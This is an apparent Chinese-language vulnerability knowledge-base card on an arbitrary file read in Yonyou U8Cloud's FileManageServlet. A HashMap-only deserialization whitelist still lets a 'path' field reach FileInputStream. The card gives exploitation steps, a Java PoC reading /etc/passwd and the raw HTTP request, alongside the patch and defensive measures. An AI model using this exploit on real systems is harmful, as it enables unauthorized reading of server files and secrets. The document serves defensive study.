---
id: web-java-deserialization-hashmap-business-field-local-file-read
title: 仅允许 HashMap 的反序列化接口被业务字段滥用：path 直达 FileInputStream 任意文件读取
type: scenario
domain: web
path: web/java/deserialization
technique: deser-hashmap-business-field-file-read
tags:
- java
- deserialization
- hashmap
- file-read
- path-traversal
- u8cloud
affected_versions: 5.0sp, 5.1, 5.1sp
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:26:29+08:00'
  notes: 已对照原文核对：doAction 的 HashMap 头分发、doDownLoadFileLocal 直接 new FileInputStream(path)、canonical path 补丁前后代码、2025 公告影响版本 5.0sp/5.1/5.1sp 均一致；卡片为代码+公告分析，原文未给出该分支的实际读取回显；未验证点：未实际复现
url: /docs/web/java/deserialization/web-java-deserialization-hashmap-business-field-local-file-read/
draft: false
kb_aliases:
- 用友 U8Cloud FileManageServlet 任意文件读取
- downloadlocal 任意文件读取
- HashMap 反序列化业务字段
- FileInputStream 路径未校验
- 序列化协议头携带 path
---

## 一句话结论

即使反序列化过滤器只允许 `HashMap`、拒绝一切 gadget，业务逻辑仍会把反序列化出的 `HashMap` 字段当可信输入：`operType=downloadlocal` 时直接 `new FileInputStream((String)headInfo.get("path"))` 并把内容写回响应，未做规范化/目录限制，构成任意文件读取。

## 原理

- 接口协议是“先反序列化一个 `HashMap` 作为元数据头，再按 `operType` 分发”：`upload`、`download`、`downloadlocal`。`downloadlocal` 分支从 `headInfo.get("path")` 取路径，`new FileInputStream(path)` 读取后写入 `response.getOutputStream()`。
- 代码只限制了反序列化的**类**（`FilteredObjectInputStream(in, new Class[]{HashMap.class})`），没有限制 HashMap 里字符串的**内容**；攻击者无需任何 gadget，构造只含 `HashMap/String` 的合法流即可通过白名单。
- 路径未做 `getCanonicalPath()` 与前缀校验，`../`、绝对路径、符号链接都可指向任意可读文件。
- 补丁在 `FileInputStream` 前增加：`file.getCanonicalPath().startsWith(new File(NCHome + "/mpEA/").getCanonicalPath())`，否则拒绝——说明根因是路径校验缺失，而非反序列化本身。
- 更一般地：反序列化白名单只保护“能构造哪些类”，不保护“业务会拿这些数据做什么”；容器类 + 业务字段仍是攻击面。

## 触发条件

- 反序列化接口可从外部访问（本例 `/service/FileManageServlet`，原文未提认证）；
- 过滤器允许 `HashMap`（或使用 JSON 等结构化输入）且业务从其中读取路径；
- 进程对目标文件有读权限；
- 目标版本未打 canonical path 补丁（5.0sp/5.1/5.1sp）。

## 利用步骤

1. 构造 `HashMap` 头：`dsName`（可为空/合法数据源）、`operType=downloadlocal`、`path=/etc/passwd`（或目标文件绝对路径/`../` 相对路径）。
2. 用 Java `ObjectOutputStream` 序列化该 HashMap。
3. POST 到 `/service/FileManageServlet`，请求体为序列化字节。
4. 白名单只校验首个 `HashMap`，通过；业务进入 `doDownLoadFileLocal`，文件内容随响应返回。
5. 也可用 `operType=download` 走 `IFileSystemService.downLoadFile(path, out)` 读取文件系统允许的文件。

## PoC

构造序列化请求：

```java
HashMap<String, Object> head = new HashMap<>();
head.put("dsName", "ncdb");              // 任意可接受的数据源名
head.put("operType", "downloadlocal");
head.put("path", "/etc/passwd");         // 目标任意文件

ByteArrayOutputStream bos = new ByteArrayOutputStream();
try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
    oos.writeObject(head);
}
byte[] payload = bos.toByteArray();      // 作为 POST body 发送
```

```http
POST /service/FileManageServlet HTTP/1.1
Host: target
Content-Type: application/octet-stream

<序列化后的 HashMap 字节>
```

响应体即目标文件内容。

补丁对比（关键校验）：

```java
String realPath = RuntimeEnv.getInstance().getCanonicalNCHome() + File.separator + "mpEA" + File.separator;
File file = new File(path);
if (!file.getCanonicalPath().startsWith(new File(realPath).getCanonicalPath())) {
    throw new IllegalArgumentException("Prohibit access to this folder");
}
```

## 变体与关联

- `showFileInWeb0`（GET）把 `path` 先 Base64 解码再交给 `IFileSystemService.showFileInWeb(path, out)`，同样是路径未校验的文件读取面。
- 同接口的 `upload` 分支把 `in` 交给文件服务写入，可进一步研究任意文件写/路径穿越。
- 与同文章的“rootChecked 首类白名单绕过”互补：前者绕过类过滤打 gadget，本条不需要 gadget，只用合法 HashMap 滥用业务。
- 关联：Java 反序列化业务逻辑滥用、路径穿越、任意文件读取。

## 检测与防御

- 对所有由外部输入驱动的文件路径做 `getCanonicalPath()` 规范化，并校验必须位于允许目录前缀内；拒绝绝对路径、`..`、符号链接逃逸。
- 反序列化只允许必要类并限制字段内容/长度；更彻底地改为 JSON/Protobuf 并对字段做 schema/白名单校验。
- 接口加认证与授权，限制 `downloadlocal` 等本地文件操作只对管理员开放。
- 监控反序列化接口携带 `downloadlocal`、绝对路径、`../` 的请求；文件读取接口限制速率与范围。
- 升级到包含 canonical path 校验的补丁版本。
